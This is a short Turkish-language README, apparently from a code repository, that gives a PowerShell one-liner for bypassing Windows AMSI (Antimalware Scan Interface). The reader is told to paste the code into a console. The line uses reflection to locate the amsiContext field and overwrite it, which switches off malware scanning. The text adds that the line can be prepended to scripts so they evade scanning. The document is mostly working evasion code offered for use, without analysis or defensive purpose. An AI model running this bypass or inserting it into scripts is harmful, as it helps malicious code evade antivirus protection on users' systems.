# AMSI-BYPASS-ONELINER

Adım 1

Powershell i aç

Adım 2 

Konsola Aşağıdaki kodu yapıştır.

$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

Ve artık bypass ettin. Powershell scriptlerinde bypass etmek için scriptin başına'da eklenebilir.
